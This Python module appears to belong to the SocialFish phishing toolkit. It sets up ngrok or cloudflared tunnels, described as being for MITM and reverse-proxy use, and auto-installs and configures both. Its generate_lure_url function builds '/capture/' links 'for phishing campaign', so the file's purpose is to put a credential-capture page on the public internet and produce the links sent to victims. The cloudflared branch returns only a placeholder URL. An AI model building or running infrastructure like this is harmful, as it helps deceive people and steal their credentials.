#!/usr/bin/env python3
"""
Tunnel management for MITM and reverse proxy setup.
Supports ngrok and cloudflared auto-installation and configuration.
"""

import subprocess
import os
import requests
import json
import time
from pathlib import Path
import sys

TUNNEL_CONFIG_FILE = Path.home() / ".socialfish" / "tunnel_config.json"
TUNNEL_CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)

class TunnelManager:
    """Manage ngrok and cloudflared tunnels for reverse proxy and MITM"""
    
    def __init__(self):
        self.tunnels = {}
        self.load_config()
    
    def load_config(self):
        """Load tunnel tokens from config"""
        if TUNNEL_CONFIG_FILE.exists():
            with open(TUNNEL_CONFIG_FILE, 'r') as f:
                self.config = json.load(f)
        else:
            self.config = {
                'ngrok_token': None,
                'cloudflared_token': None,
                'ngrok_region': 'us',
                'tunnels': {}
            }
    
    def save_config(self):
        """Save tunnel config"""
        with open(TUNNEL_CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def check_ngrok(self):
        """Check if ngrok is installed"""
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, timeout=5)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False
    
    def check_cloudflared(self):
        """Check if cloudflared is installed"""
        try:
            result = subprocess.run(['cloudflared', '--version'], capture_output=True, timeout=5)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False
    
    def install_ngrok(self):
        """Auto-install ngrok"""
        print("[*] Installing ngrok...")
        try:
            # Try pip first
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyngrok'], check=True)
            print("[+] ngrok installed successfully via pip")
            return True
        except subprocess.CalledProcessError:
            print("[-] Failed to install ngrok")
            return False
    
    def install_cloudflared(self):
        """Auto-install cloudflared via package manager or curl"""
        print("[*] Installing cloudflared...")
        try:
            # Try npm first (if available)
            subprocess.run(['npm', 'install', '-g', 'cloudflared'], check=True)
            print("[+] cloudflared installed successfully via npm")
            return True
        except subprocess.CalledProcessError:
            print("[!] npm install failed, trying apt...")
            try:
                # Try apt
                subprocess.run(['sudo', 'apt', 'update'], check=True)
                subprocess.run(['sudo', 'apt', 'install', '-y', 'cloudflared'], check=True)
                print("[+] cloudflared installed successfully via apt")
                return True
            except subprocess.CalledProcessError:
                print("[-] Failed to install cloudflared")
                return False
    
    def setup_ngrok(self, token):
        """Configure ngrok with auth token"""
        print(f"[*] Configuring ngrok...")
        self.config['ngrok_token'] = token
        self.save_config()
        
        try:
            # Use pyngrok to set token
            from pyngrok import ngrok as pyngrok_ngrok
            pyngrok_ngrok.set_auth_token(token)
            print("[+] ngrok token set successfully")
            return True
        except Exception as e:
            print(f"[-] Failed to set ngrok token: {e}")
            return False
    
    def setup_cloudflared(self, token=None):
        """Configure cloudflared (token optional, can use zero-trust)"""
        print(f"[*] Configuring cloudflared...")
        if token:
            self.config['cloudflared_token'] = token
        self.save_config()
        print("[+] cloudflared configuration saved")
        return True
    
    def start_ngrok_tunnel(self, local_port=5000, protocol='http', session_name='socialfish'):
        """Start ngrok tunnel"""
        if not self.check_ngrok() and not self.install_ngrok():
            print("[-] ngrok not available")
            return None
        
        try:
            from pyngrok import ngrok as pyngrok_ngrok
            
            if self.config.get('ngrok_token'):
                pyngrok_ngrok.set_auth_token(self.config['ngrok_token'])
            
            url = pyngrok_ngrok.connect(local_port, proto=protocol)
            
            tunnel_info = {
                'type': 'ngrok',
                'url': url,
                'local_port': local_port,
                'protocol': protocol,
                'started_at': time.time()
            }
            self.tunnels[session_name] = tunnel_info
            
            print(f"[+] ngrok tunnel started: {url}")
            return url
        except Exception as e:
            print(f"[-] Failed to start ngrok tunnel: {e}")
            return None
    
    def start_cloudflared_tunnel(self, local_port=5000, session_name='socialfish'):
        """Start cloudflared tunnel"""
        if not self.check_cloudflared() and not self.install_cloudflared():
            print("[-] cloudflared not available")
            return None
        
        try:
            # Start cloudflared as subprocess
            cmd = [
                'cloudflared', 'tunnel', 'run',
                '--url', f'http://localhost:{local_port}'
            ]
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(2)  # Wait for tunnel to start
            
            # Try to get the URL from cloudflared (may require additional config)
            # For now, we'll assume the tunnel is running and will be available at cloudflared.local
            tunnel_info = {
                'type': 'cloudflared',
                'pid': proc.pid,
                'local_port': local_port,
                'started_at': time.time()
            }
            self.tunnels[session_name] = tunnel_info
            
            print(f"[+] cloudflared tunnel started (PID: {proc.pid})")
            return f"https://<cloudflared-domain>.trycloudflare.com"
        except Exception as e:
            print(f"[-] Failed to start cloudflared tunnel: {e}")
            return None
    
    def stop_tunnel(self, session_name='socialfish'):
        """Stop active tunnel"""
        if session_name not in self.tunnels:
            print(f"[-] No tunnel found for {session_name}")
            return False
        
        tunnel = self.tunnels[session_name]
        
        try:
            if tunnel['type'] == 'ngrok':
                from pyngrok import ngrok as pyngrok_ngrok
                pyngrok_ngrok.disconnect(tunnel['url'])
                print(f"[+] ngrok tunnel stopped")
            elif tunnel['type'] == 'cloudflared':
                os.kill(tunnel['pid'], 15)
                print(f"[+] cloudflared tunnel stopped")
            
            del self.tunnels[session_name]
            return True
        except Exception as e:
            print(f"[-] Failed to stop tunnel: {e}")
            return False
    
    def generate_lure_url(self, template_name, tunnel_url, lure_hash):
        """Generate lure URL for phishing campaign"""
        if not tunnel_url:
            return None
        
        # Clean tunnel URL
        if tunnel_url.startswith('http://') or tunnel_url.startswith('https://'):
            base_url = tunnel_url
        else:
            base_url = f"https://{tunnel_url}"
        
        lure_url = f"{base_url}/capture/{lure_hash}"
        
        print(f"[+] Generated lure URL: {lure_url}")
        return lure_url
    
    def get_tunnel_status(self, session_name='socialfish'):
        """Get tunnel status"""
        if session_name not in self.tunnels:
            return {'status': 'not_running'}
        
        tunnel = self.tunnels[session_name]
        return {
            'status': 'running',
            'type': tunnel['type'],
            'url': tunnel.get('url'),
            'pid': tunnel.get('pid'),
            'uptime': time.time() - tunnel['started_at']
        }
    
    def list_tunnels(self):
        """List all active tunnels"""
        return self.tunnels
    
    def interactive_setup(self):
        """Interactive setup for tunnel configuration"""
        print("\n[*] SocialFish Tunnel Setup")
        print("=" * 50)
        print("1. ngrok (recommended - fast, reliable)")
        print("2. cloudflared (Cloudflare Tunnel, free tier)")
        print("0. Skip for now")
        
        choice = input("\nChoose tunnel type: ").strip()
        
        if choice == '1':
            token = input("Enter ngrok auth token (get from https://dashboard.ngrok.com/auth): ").strip()
            if token:
                if not self.check_ngrok():
                    if not self.install_ngrok():
                        print("[-] Failed to install ngrok")
                        return False
                return self.setup_ngrok(token)
        elif choice == '2':
            if not self.check_cloudflared():
                if not self.install_cloudflared():
                    print("[-] Failed to install cloudflared")
                    return False
            return self.setup_cloudflared()
        else:
            print("[!] Tunnel setup skipped")
            return True
        
        return False

def main():
    """CLI for tunnel management"""
    import argparse
    
    parser = argparse.ArgumentParser(description='SocialFish Tunnel Manager')
    subparsers = parser.add_subparsers(dest='command')
    
    # Setup command
    setup_parser = subparsers.add_parser('setup', help='Interactive tunnel setup')
    
    # Start tunnel
    start_parser = subparsers.add_parser('start', help='Start tunnel')
    start_parser.add_argument('--type', choices=['ngrok', 'cloudflared'], default='ngrok')
    start_parser.add_argument('--port', type=int, default=5000)
    start_parser.add_argument('--name', default='socialfish')
    
    # Stop tunnel
    stop_parser = subparsers.add_parser('stop', help='Stop tunnel')
    stop_parser.add_argument('--name', default='socialfish')
    
    # Status
    status_parser = subparsers.add_parser('status', help='Check tunnel status')
    status_parser.add_argument('--name', default='socialfish')
    
    args = parser.parse_args()
    
    manager = TunnelManager()
    
    if args.command == 'setup':
        manager.interactive_setup()
    elif args.command == 'start':
        if args.type == 'ngrok':
            manager.start_ngrok_tunnel(args.port, session_name=args.name)
        else:
            manager.start_cloudflared_tunnel(args.port, session_name=args.name)
    elif args.command == 'stop':
        manager.stop_tunnel(args.name)
    elif args.command == 'status':
        status = manager.get_tunnel_status(args.name)
        print(json.dumps(status, indent=2))
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
